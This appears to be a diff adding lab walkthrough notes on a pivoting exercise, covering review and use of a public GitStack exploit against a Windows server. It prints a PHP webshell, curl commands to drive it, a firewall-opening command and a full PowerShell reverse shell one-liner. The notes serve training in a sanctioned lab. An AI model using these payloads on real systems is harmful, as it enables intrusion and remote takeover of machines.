@@ -861,4 +861,154 @@ curl <ip>
 
 ```
 sshuttle -r root@10.200.198.200 --ssh-cmd "ssh -i id_rsa" 10.200.198.0/24 -x 10.200.198.200 
+
+searchsploit gitstack
+
 ```
+
+## Code Review
+
+In the previous task we found an exploit that might work against the service running on the second server.
+
+Make a copy of this exploit in your local directory using the command:
+
+Before we can use the exploit, we must convert these into Linux line endings using the dos2unix tool:
+```
+dos2unix ./EDBID.py
+```
+This  can also be done manually with sed if dos2unix is unavailable:
+```
+sed -i 's/\r//' ./EDBID.py
+```
+
+With the file converted, it's time to read through the exploit to make sure we know what it's doing. The fact that the exploit is on Exploit-DB means that it's unlikely to be outright malicious, but there's no guarantee that it will work, or do anything close to exploiting a vulnerabilty in the service.
+
+Open the exploit in your favourite text editor and let's get going!
+
+
+As this is a Python script, the version of the language used to write the software matters. Many older exploits are still written in Python2. These exploits tend to be incompatible with the Python3 interpreter, and vice versa.
+
+Before we can do anything else, we need to determine whether this exploit was written in Python2 or Python3. A quick way of doing this is to look for the print statements (used to echo output to the console).  If there are no round brackets (e.g. print "Hello World!") then the exploit will be Python2, otherwise the exploit is likely to be Python3 (e.g. print("Hello World!")). Of course, this is far from the only way to check, but it will work for our purposes.
+
+
+Now that we know which version of Python we're dealing with we can execute it in one of two ways:
+
+- Using the appropriate interpreter directly (e.g. python3 exploit.py / python2 exploit.py)
+- Adding a shebang line in at the top of the exploit. A shebang tells the Unix program loader which interpreter to use to run a script. Shebangs always start with the characters: #!. You then specify the absolute path to the interpreter, so: #!/usr/bin/python3 / #!/usr/bin/python2 / #!/bin/sh, etc. This means that if we execute the script using ./exploit.py, it will be executed by the correct interpreter.
+
+
+Let's have a look through some of the key sections of the code.
+
+This script is not designed to be fancy. It does what we need it to do, and nothing more. All configurations are done within the code by literally editing the script, so it's important that we understand the options available to us. These can be found in lines 23-31 (offset by minus one if you didn't add the shebang):
+
+![image](https://user-images.githubusercontent.com/89842187/132001326-e83000d5-bac9-4798-8fea-be9bb72dc1b4.png)
+
+Realistically we are only interested in the first two variables here, as the other options should be fine at their default values. The two variables we care about are ip and command, allowing us to specify our target and the command to run, respectively.
+
+Set the IP to the correct target for your choice of pivoting technique. If you used sshuttle or one of the proxying techniques then this will just be the IP of the target. If you used a port forward then it will be localhost:chosen_port, e.g.:
+
+For the time being we will leave the command as it is. whoami is as good a command as any to confirm that the exploit works.
+
+The bulk of the middle section of the code is taking advantage of the improper access controls which make this vulnerability possible. We will not cover this in detail in order to keep this task relatively short; however, reading through the exploit (and trying to understand it) would be highly advisable.
+
+We are, however, interested in the last 6 lines of the exploit:
+
+![image](https://user-images.githubusercontent.com/89842187/132001458-f900dfbd-2559-4ac7-9896-372f3a088a79.png)
+
+hese create a PHP webshell (<?php system($_POST['a']); ?>) and echo it into a file called exploit.php under the webroot. This can then be accessed by posting a command to the newly created /web/exploit.php file.
+
+For the sake of not spoiling things for other users, we are going to alter this before running the script.
+
+We can leave the payload as it is, but we will alter both instances of "exploit.php" in the script to be exploit-USERNAME.php, for example:
+
+![image](https://user-images.githubusercontent.com/89842187/132001470-381c80c5-3340-4847-84de-20e3d75bafb4.png)
+
+Having added in a shebang, changed the target, and updated the name of the exploit.php file, the exploit should now be fully configured so we will perform the exploit in the next task.
+
+Just to confirm that you have been paying attention to the script: What is the name of the cookie set in the POST request made on line 74 (line 73 if you didn't add the shebang) of the exploit?
+
+## Exploitation
+
+In the previous task we had a look through the source code of the exploit we found, identified the lines which needed to be updated, then made the necessary changes.
+
+It is now time to run the exploit!
+![image](https://user-images.githubusercontent.com/89842187/132015564-a8522362-3a7c-4119-ba9d-6d3fd3ca1297.png)
+
+
+Success!
+
+Not only did the exploit work perfectly, it gave us command execution as NT AUTHORITY\SYSTEM, the highest ranking local account on a Windows target.
+
+From here we want to obtain a full reverse shell. We have two options for this:
+
+We could change the command in the exploit and re-run the code
+We could use our knowledge of the script to leverage the same webshell to execute more commands for us, without performing the full exploit twice
+Option number two is a lot quieter than option number 1, so let's use that.
+
+The webshell we have uploaded responds to a POST request using the parameter "a" (by default). This means that we have two easy ways to access this. We could use cURL from the command line, or BurpSuite for a GUI option.
+
+
+With cURL:
+```
+curl -X POST http://IP/web/exploit-USERNAME.php -d "a=COMMAND"
+```
+Note: in this screenshot, gitserver.thm has been added to the /etc/hosts file on the attacking machine, mapped to the target IP address.
+
+## With BurpSuite:
+
+![image](https://user-images.githubusercontent.com/89842187/132019025-be9bd36f-1e34-4e06-b9c7-1f4aa6402303.png)
+
+We then press Ctrl + R to send the request to Repeater on the top menu.
+
+Next we change the "GET" on line 1 to "POST". We then add a Content-Type header on line 9 to tell the server to accept POST paramters:
+Content-Type: application/x-www-form-urlencoded
+
+Finally, on line 11 we add a=COMMAND:
+
+![image](https://user-images.githubusercontent.com/89842187/132019039-707611c0-af52-43f6-9887-d431f379e47f.png)
+
+Press send, and see the response come in!
+
+![image](https://user-images.githubusercontent.com/89842187/132019048-a0e20870-490a-4d40-bbc0-0d712d8b5ddd.png)
+
+
+Before we go for a reverse shell, we need to establish whether or not this target is allowed to connect to the outside world. The typical way of doing this is by executing the ping command on the compromised server to ping our own IP and using a network interceptor (Wireshark, TCPDump, etc) to see if the ICMP echo requests make it through. If they do then network connectivity is established, otherwise we may need to go back to the drawing board.
+
+To start up a TCPDump listener we would use the following command:
+tcpdump -i tun0 icmp
+
+Note: if your VPN is not using the tun0 interface then you will need to replace this with the correct interface for your system which can be found using ip -a link to see the available interfaces.
+
+Now, using the webshell, execute the following ping command (substituting in your own VPN IP!):
+ping -n 3 ATTACKING_IP
+
+
+Looks like we're going to need to think outside the box to catch this shell.
+
+We have two easy options here:
+
+- Given we have a fully stable shell on .200, we could upload a static copy of netcat and just catch the shell here
+- We could set up a relay on .200 to forward a shell back to a listener
+
+
+It is up to you which option you choose (although for the sake of practice, a socat relay is suggested); however, whichever way you choose, please be mindful of other users at earlier stages of the network and ensure that any ports you open are above 15000.
+Before we can do this, however, we need to take one other thing into account. CentOS uses an always-on wrapper around the IPTables firewall called "firewalld". By default, this firewall is extremely restrictive, only allowing access to SSH and anything else the sysadmin has specified. Before we can start capturing (or relaying) shells, we will need to open our desired port in the firewall. This can be done with the following command:
+firewall-cmd --zone=public --add-port PORT/tcp
+Substituting in your desired choice of port.
+
+In this command we are using two switches. First we set the zone to public -- meaning that the rule will apply to every inbound connection to this port. We then specify which port we want to open, along with the protocol we want to use (TCP).
+
+
+Let's go for a reverse shell!
+
+We can use a Powershell reverse shell for this. Take the following shell command and substitute in the IP of the webserver, and the port you opened in the .200 firewall in the previous question where it says IP and PORT:
+
+```
+powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+As this is a web exploit, we now have to URL encode the shell command. If using Burpsuite, you can do this by pasting the command in as the value for the "a" parameter, then selecting it and pressing Ctrl + U:
+
+![image](https://user-images.githubusercontent.com/89842187/132019199-442dfad4-3571-42dc-a1b7-fbecd46e072c.png)
+
+f you are using cURL then there are a variety of options available. cURL does provide a --data-urlencode switch; however, it's often easiest to just use a website https://www.urlencoder.org/ to encode the shell command, then copy it in with the -d switch:
